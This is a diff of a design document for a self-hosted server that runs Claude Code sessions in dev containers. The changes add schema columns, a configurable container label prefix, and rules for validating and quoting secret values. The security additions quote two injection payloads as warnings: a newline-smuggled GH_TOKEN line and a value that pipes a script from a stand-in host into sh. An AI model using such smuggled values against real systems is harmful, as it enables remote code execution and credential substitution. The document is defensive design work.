@@ -2,7 +2,7 @@
 
 *A single-host server that turns any GitHub repository into a running dev container with a supervised, remote-controllable Claude Code session inside it — one click from a repo list, with push credentials scoped to that repo alone.*
 
-**Status** design document, draft v6 · **Date** 2 October 2026 · Phase 0 spikes complete — §7.2, §7.3, §8, §10.3, and §11 revised against measurement (see [spikes](../spikes/)); §13 auth revised for cross-site previews (see the [security review](../security-review.md) and [port forwarding](../port-forwarding/port-forwarding-design.md))
+**Status** design document, draft v7 · **Date** 4 October 2026 · five findings from the [testing plan](../testing/testing-design.md) §15 applied — §4, §6, §10.1, §10.3 and §13.5; Phase 0 spikes complete — §7.2, §7.3, §8, §10.3, and §11 revised against measurement (see [spikes](../spikes/)); §13 auth revised for cross-site previews (see the [security review](../security-review.md) and [port forwarding](../port-forwarding/port-forwarding-design.md))
 
 **Runtime** single dev server, local Docker socket · **Reach** LAN, behind Caddy
 
@@ -190,6 +190,8 @@ workspace(
   state_detail TEXT,
   container_id TEXT,           -- cache; reconciled from labels at boot
   remote_user TEXT,
+  environment_id TEXT,         -- env_… advertised by the remote-control server (§8);
+                               -- survives restart, and is the card's only link
   created_at TEXT, last_active_at TEXT
 )
 
@@ -198,7 +200,9 @@ workspace(
 supervisor(
   id TEXT PRIMARY KEY,
   workspace_id TEXT NOT NULL REFERENCES workspace(id),
-  state TEXT NOT NULL,         -- starting|awaiting_login|serving|degraded|exited
+  state TEXT NOT NULL,         -- starting|waiting_registration|awaiting_login|
+                               -- serving|degraded|exited  (§8: a 409 is a wait,
+                               -- and must be distinguishable from a failure)
   pid INTEGER, restart_count INTEGER DEFAULT 0,
   capacity INTEGER NOT NULL,   -- what --capacity was set to for this process
   last_error TEXT,
@@ -222,7 +226,8 @@ claude_identity(
   volume_name TEXT NOT NULL,   -- shared credential volume
   account_email TEXT,
   logged_in_at TEXT,
-  expires_at TEXT,             -- parsed from /status; drives the renewal nag
+  state TEXT NOT NULL,         -- ok|expiring|expired|blanked|absent (§7.3)
+  expires_at TEXT,             -- claudeAiOauth.expiresAt; drives the renewal nag
   last_checked_at TEXT
 )
 
@@ -271,6 +276,8 @@ event(
   message TEXT, at TEXT
 )
 ```
+
+Three columns exist for the opposite reason — because a state the prose requires and the schema cannot hold is a state that gets inferred differently by every reader. `claude_identity.state` carries the five-way verdict §7.3 needs, including the *blanked* case that cannot be derived from `expires_at` alone; `workspace.environment_id` holds the durable handle §8 settled on; and `supervisor.state` has a `waiting_registration` value so the `409` wait in §8 is not stored as a failure. Each is written from one classifier and read everywhere.
 
 Four notes on what is deliberately absent. There is no plaintext secret value — and no route that returns one, which is why the schema has no `value` column to be tempted by. There is no plaintext session token — `auth_session.id` is the SHA-256 of the cookie value, so a stolen database file yields no usable cookie. There is no `github_token` column — tokens live in a bounded in-memory cache keyed by `(workspace_id, permission_set)` and are dropped at their expiry. And `token_grant` records that a token was issued and to whom, never the token itself, so the table is safe to read, export, and keep.
 
@@ -357,7 +364,7 @@ devcontainer up \
 
 ### Reconciliation on boot
 
-Drydock restarting must not orphan containers or double-start sessions. On startup it lists containers by `label=drydock.workspace` and reconciles in one direction — **Docker is the truth, the database is the cache**:
+Drydock restarting must not orphan containers or double-start sessions. On startup it lists containers by its configured workspace label and reconciles in one direction — **Docker is the truth, the database is the cache**:
 
 | DB says | Docker says | Action |
 |---|---|---|
@@ -366,6 +373,13 @@ Drydock restarting must not orphan containers or double-start sessions. On start
 | `running` | Absent | Mark `stopped`, clear `container_id`. Clone is intact; `start` rebuilds. |
 | Absent | Running | Orphan from a lost DB. Log it, adopt the row from labels rather than killing someone's work. |
 | `deleting` | Any | Resume the delete. This is why `deleting` is a persisted state and not a flag in memory. |
+
+> [!WARNING]
+> **The label key is configuration, not a constant**
+>
+> Everything above adopts, stops, and deletes by label, so **whichever Drydock owns a label prefix owns those containers.** A second instance on the same daemon pointed at the same prefix will adopt the first's workspaces and its delete path will remove them — and the advisory lock in §12 does not help, because that lock is on a database file and the second instance has its own.
+>
+> That second instance is not hypothetical: it is what a test run is, and it is what a staging copy on the dev server would be. So the prefix is configured (default `drydock`, giving `drydock.workspace=<id>`), it is recorded in the database at first run, and **startup refuses to adopt a container whose label prefix is not its own** — it logs the container and leaves it alone, which is the same "adopt rather than kill someone's work" instinct as the orphan row above, applied one level up.
 
 ## 7. Claude Code auth
 
@@ -421,7 +435,7 @@ Implementation notes that matter:
 
 ### 7.3  Expiry watch
 
-A poller runs every six hours in the auth container and records `expires_at`. Three days out, the UI shows a persistent banner and every workspace card carries a warning dot. On expiry, supervisors are marked `degraded` rather than restarted — restarting cannot fix a missing credential, and a restart loop would just burn the log.
+A poller runs every six hours in the auth container and records `claude_identity.state` and `expires_at` (§4) — the verdict as a stored value rather than one each reader re-derives. Three days out, the UI shows a persistent banner and every workspace card carries a warning dot. On expiry, supervisors are marked `degraded` rather than restarted — restarting cannot fix a missing credential, and a restart loop would just burn the log.
 
 **No terminal scraping is needed here.** [Spike 01](../spikes/01-login-handshake.md) found `claude auth status --json`, which is machine-readable by default. The poll is two mechanical reads:
 
@@ -602,7 +616,7 @@ A secret is a name, a value, a declared reach, and a set of repo grants. **Defau
 | Field | Notes |
 |---|---|
 | `name` | Also the environment variable name, so it must match `[A-Z_][A-Z0-9_]*`. Validated on write, not at injection time — see the reserved list below. |
-| `value` | Encrypted at rest (§10.2). Write-only through the API: the UI shows metadata and never returns a stored value. |
+| `value` | Encrypted at rest (§10.2). Write-only through the API: the UI shows metadata and never returns a stored value. Must be a single line — see *Value validation* below, which is a security control rather than tidiness. |
 | `reach` | A required sentence answering “what can someone do with this?” Free text, but not optional. §10.4 explains why this field exists and why it is the actual security control. |
 | `description` | Where it came from and how to rotate it. Written now, read at 2am in six months. |
 | grants | Rows in `secret_grant`, one per repository. An `all_repos` flag exists for the genuinely universal ones and the UI treats choosing it as a decision, not a shortcut. |
@@ -615,6 +629,15 @@ Secret names become environment variables in the session process, which means a 
 - `ANTHROPIC_BASE_URL`, `DISABLE_TELEMETRY`, `DO_NOT_TRACK`, `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`, `DISABLE_GROWTHBOOK` — each one disables Remote Control (§2.1). A secret that quietly turns off the feature the whole system exists for is the worst possible failure mode: everything builds, nothing connects.
 - `GH_TOKEN`, `GITHUB_TOKEN` — would shadow the `gh` shim's per-invocation token from §9.2, replacing an expiring repo-scoped credential with a static one.
 - `CLAUDE_CONFIG_DIR`, `PATH`, `HOME`, `SHELL`, `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN` — each breaks something in §7 or §9 in a way that looks like an unrelated bug.
+
+#### Value validation
+
+Names are validated because a bad one breaks the system quietly. **Values are validated because a bad one is an injection**, and the reason is in §10.3: a value travels to the container over a line-oriented socket protocol and arrives as shell text. Drydock therefore refuses, on write:
+
+- **Any control character** — `\n`, `\r`, and NUL in particular. A newline inside a value forges an extra `NAME value` line in the `GET-SECRETS` response (§10.3), and a forged line is how the reserved-name list above gets bypassed: a value of `hunter2\nGH_TOKEN ghp_…` delivers a second secret the list never saw, shadowing the `gh` shim's expiring repo-scoped token with a static attacker-chosen one.
+- **An empty value.** Nothing downstream can distinguish it from an unset variable, so storing one buys a grant that silently does nothing.
+
+Rejecting at write time rather than escaping at delivery time is deliberate, and it is the same choice as the reserved-name list: the write is a human action with an error message attached, while delivery is a socket read inside a container where the only options are to fail a session or to guess. It also keeps the protocol in §10.3 small enough that the in-container client can stay a shell script, which is the property that makes it auditable at a glance.
 
 ### 10.2  Storage
 
@@ -634,6 +657,20 @@ Secrets ride the mechanism that already exists. The broker socket from §9 gains
 ← S3_STAGING_SECRET …
 ← END
 ```
+
+> [!WARNING]
+> **Two places where an arbitrary byte string meets a textual channel**
+>
+> The protocol above is line-oriented and its output is consumed by `eval`. Secret values are arbitrary bytes. Both halves of that need a rule, or a stored value becomes code:
+>
+> | Channel | Rule | Without it |
+> |---|---|---|
+> | the socket response | values are single-line, enforced at write (§10.1); the client **fails the fetch** if `count=` disagrees with the number of lines received | a newline in a value forges a second `NAME value` line and bypasses the reserved-name list |
+> | `eval "$(drydock-secrets export)"` | `export` emits every value **single-quoted**, with embedded single quotes escaped as `'\''` | a value of `'; curl -s evil.example/x \| sh; '` runs as the remote user, with the broker socket mounted |
+>
+> The second one is the sharper of the two now that the prelude below runs before *every* Bash command rather than once per supervisor start: an unquoted value is not executed once, it is executed continuously. Neither rule is expensive — one validator and one quoting function — and both are the kind of thing that is obvious in hindsight and invisible in prose, so they are stated as rules rather than left to the implementation. The counter-check is a property test: for arbitrary byte strings, `eval "$(drydock-secrets export)"` must leave the variable byte-identical to what was stored.
+>
+> Note that Spike 03's finding that values stay out of `ps` is **not** a substitute. That holds because the helper is *invoked* from the prelude rather than inlined, and says nothing about whether its output is safe to `eval`.
 
 The supervisor materializes them into the session process's environment at exec time, through a helper that reads the socket *inside* the container:
 
@@ -786,13 +823,17 @@ The current default-features mechanism applies a `CLAUDE_CONFIG_DIR` mount to ev
 | Repo removed from the installation | Catalog refresh; token mint fails | Mark the workspace read-only, keep the container. The working tree may hold unpushed work. |
 | Rotated secret not picked up | Workspace marked stale on rotation | Say which kind of stale it is (§10.3): new commands pick it up on their own, MCP servers and background processes do not. Never auto-restart — a session mid-task is not something to kill for a config change. |
 | Secret name collides with a reserved variable | Rejected at write time (§10.1) | Refuse with the reason named. Catching this at injection time instead would mean a container that builds, starts, and never connects. |
+| Secret value contains a newline or NUL | Rejected at write time (§10.1) | Refuse and say which character. Accepting it would forge a line in the `GET-SECRETS` response (§10.3) and bypass the reserved-name list, which is an injection rather than a formatting problem. |
+| `GET-SECRETS` line count disagrees with the lines received | The client's own check (§10.3) | Fail the fetch, not the parse — the prelude `exit`s non-zero and the command aborts loudly. A short read is indistinguishable from a truncated secret, and running a test suite against a half-delivered environment is the worse outcome. |
 | A secret leaked somewhere | You find out from the far service, as usual | Rotate at the source, then `PUT` the new value. `secret_access` answers which workspaces ever held it; that list is the scope of the incident. |
 | Stopped a workspace mid-task | Nothing detects it — you did it | Since capacity is managed by hand (§1), the stop button shows the live session count and asks for confirmation when it is not zero. Unpushed work in the clone and its worktrees survives; only the conversation is lost. |
 | Disk full | Pre-flight check before clone and build | Refuse new workspaces above a threshold. Show per-workspace disk in the UI so the operator knows what to delete. |
 | Repeated failed sign-ins | `auth_attempt` rows from one or many IPs | Backoff, then a global cap. Surface it in the UI on next sign-in — on a home LAN this is usually a stale saved password, but you want to see it either way. |
 | Caddy down or misconfigured | UI unreachable; Drydock's socket has no clients | Drydock keeps running and containers keep working — the proxy is not in the agent's path. Fix from a shell; never add a fallback TCP listener. |
 | Lost or stolen device | You notice | Revoke all sessions from any other signed-in device; rotate the password with `drydock passwd`. Container credentials are unaffected. |
-| Two Drydocks on one host | Advisory lock on the SQLite file at startup | Refuse to start. Two supervisors on one container is a mess nobody wants to debug. |
+| Two Drydocks on one host, same label prefix | Advisory lock on the SQLite file at startup | Refuse to start. Two supervisors on one container is a mess nobody wants to debug. |
+| Two Drydocks on one host, different label prefixes | Prefix check during reconciliation (§6) | Each adopts only its own containers; foreign ones are logged and left running. This is the case a test run creates, and the one where getting it wrong deletes real work. |
+| `remote-control` refuses with `409` | Message match on startup failure (§8) | A **wait**, not a crash: its own supervisor state, a flat retry interval, no charge against the restart budget, and a UI that says *waiting for the previous server to release the folder*. Every startup failure exits `1`, so the message is the only discriminator. |
 | Server reboot | Startup reconciliation (§6) | Adopt running containers, resume sessions, never auto-start what was stopped. |
 
 ## 13. Security
@@ -887,6 +928,8 @@ The reason to take this seriously on a home network specifically: the LAN contai
 - **Delete requires typing the repo name — and that is the only friction.** No re-authentication prompt on destructive routes: a valid session is treated as you, because on a single-operator system with a device you do not hand around, a second password prompt buys habituation rather than safety. The name-typing stops the misplaced tap, which is the failure that actually happens.
 - **Redact by default.** Passwords, login codes, session tokens, GitHub tokens, repository secrets, and PTY buffers never reach the event log, a persisted file, or Caddy's access log.
 - **No route returns a secret value.** Not for an edit form, not for a “reveal” button, not behind a re-auth prompt. The schema has no column for it and the API has no shape for it, so a stolen session cannot harvest what you have stored — only what a workspace it can reach already holds.
+- **A secret value is single-line on write, and single-quoted on delivery.** Control characters are refused by the API (§10.1); `drydock-secrets export` quotes every value (§10.3). Either rule missing turns “can store a secret” into “can run code in every granted container, before every command”, which is a boundary nothing else in this design recovers.
+- **The workspace label prefix is configuration, and reconciliation refuses a foreign one.** Adoption and deletion are label-driven (§6), so a second instance sharing the prefix inherits the first's containers — including its delete path. The SQLite advisory lock does not cover this, because the second instance has its own database.
 
 One genuinely open risk, unchanged by any of the above and now slightly larger: a repo's `devcontainer.json` is executable code from the repo, and Drydock builds it on the host with the Docker socket in reach. For repos you own this is the same trust you already extend by opening them in VS Code. What the LAN binding changes is who can *trigger* that build — which is why the answer to “how much does auth matter here” is “it is the only thing standing between a device on your wifi and code execution on your dev server.”
 
@@ -945,6 +988,9 @@ Recorded because the reasoning is easier to lose than the decision.
 | Can a rotated secret reach a live session without a restart? | **Yes** — `CLAUDE_ENV_FILE` runs once per Bash command ([Spike 03](../spikes/03-claude-env-file.md)). "The environment pulls" is the mechanism; the `CLAUDE.md` convention is the fallback (§10.3). |
 | Does a supervisor restart lose the running sessions? | **No** — a plain restart in the same directory reconnects the same environment *and* sessions, after a crash as well as a clean stop ([Spike 02](../spikes/02-rc-restart.md)). `--continue` is unusable in server mode, and a `409` on restart is a wait, not a failure (§8). |
 | Does Drydock have to scrape a terminal to watch credential expiry? | **No** — `claude auth status --json` is machine-readable and sees the blanked-credential state; only the countdown needs a file read ([Spike 01](../spikes/01-login-handshake.md), §7.3). |
+| Validate secret values, or escape them at delivery? | **Validate on write** (§10.1), and quote at delivery anyway (§10.3). The write is a human action with an error message attached; delivery is a socket read inside a container, where the only choices are to fail a session or to guess. |
+| Is `drydock.workspace` a constant? | **No — a configured prefix** (§6), recorded at first run, with reconciliation refusing a foreign one. The second instance that forced this is the test suite, which is label-driven adoption pointed at real workspaces. |
+| Where do the environment id, the identity verdict, and the `409` wait live? | **In columns** (§4). A state the prose requires and the schema cannot hold is one every reader infers differently; all three now come from a single classifier. |
 
 ---
 
